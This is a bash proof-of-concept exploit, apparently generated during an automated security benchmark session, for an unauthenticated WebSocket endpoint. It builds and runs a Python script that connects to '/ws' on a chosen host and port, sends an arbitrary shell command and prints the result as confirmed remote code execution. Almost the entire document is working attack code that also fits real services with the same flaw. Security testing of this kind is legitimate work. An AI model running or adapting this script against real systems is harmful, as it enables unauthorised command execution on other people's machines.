#!/bin/bash
# POC: Demonstrates unauthenticated WebSocket connection to /ws endpoint and remote code execution via arbitrary shell commands without any authentication
# Target: ./repo
# Created: 2025-11-07T18:28:12.643Z
# Session: benchmark-XBEN-097-24-mhp6l4fm

# WebSocket Authentication Bypass RCE POC
# This script demonstrates the vulnerability in the WebSocket endpoint /ws
# that accepts unauthenticated connections and executes arbitrary shell commands

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-22222}"
COMMAND="${3:-whoami}"

echo "[*] WebSocket Authentication Bypass RCE POC"
echo "[*] Target: ws://${TARGET_HOST}:${TARGET_PORT}/ws"
echo "[*] Command to execute: ${COMMAND}"
echo ""

# Create a Python script to test WebSocket connection
cat > /tmp/ws_exploit.py << 'EOF'
#!/usr/bin/env python3
import sys
import asyncio
import websockets
import json
import time

async def exploit_websocket(host, port, command):
    """
    Connect to the unauthenticated WebSocket endpoint and execute a command.
    The vulnerability is that no authentication is required to connect or send commands.
    """
    ws_uri = f"ws://{host}:{port}/ws"
    
    try:
        print(f"[+] Connecting to {ws_uri}...")
        async with websockets.connect(ws_uri) as websocket:
            print("[+] Successfully connected to WebSocket endpoint (NO AUTHENTICATION REQUIRED!)")
            print("[*] Connection established without any credentials, tokens, or headers")
            
            # Send command to execute
            print(f"[+] Sending command: {command}")
            
            # The server appears to accept commands directly
            await websocket.send(command)
            
            # Wait for response
            try:
                response = await asyncio.wait_for(websocket.recv(), timeout=5)
                print(f"[+] Command output received:")
                print(f"    {response}")
                return True
            except asyncio.TimeoutError:
                print("[-] No response received (timeout)")
                return False
                
    except ConnectionRefusedError:
        print(f"[-] Connection refused to {ws_uri}")
        print("[-] WebSocket service may not be running")
        return False
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 22222
    command = sys.argv[3] if len(sys.argv) > 3 else "whoami"
    
    result = asyncio.run(exploit_websocket(host, port, command))
    sys.exit(0 if result else 1)
EOF

# Check if Python3 and websockets module are available
if ! command -v python3 &> /dev/null; then
    echo "[-] Python3 is not installed"
    exit 1
fi

# Try to import websockets
python3 -c "import websockets" 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[*] Installing websockets module..."
    pip3 install websockets -q 2>/dev/null || pip install websockets -q 2>/dev/null
fi

# Execute the exploit
echo "[*] Executing WebSocket exploit..."
echo ""
python3 /tmp/ws_exploit.py "${TARGET_HOST}" "${TARGET_PORT}" "${COMMAND}"
RESULT=$?

# Cleanup
rm -f /tmp/ws_exploit.py

echo ""
if [ $RESULT -eq 0 ]; then
    echo "[+] VULNERABILITY CONFIRMED: Unauthenticated WebSocket RCE"
    echo "[+] The endpoint accepted the connection WITHOUT authentication"
    echo "[+] Command was executed successfully"
else
    echo "[-] Could not confirm vulnerability (service may not be running or response format differs)"
fi

exit $RESULT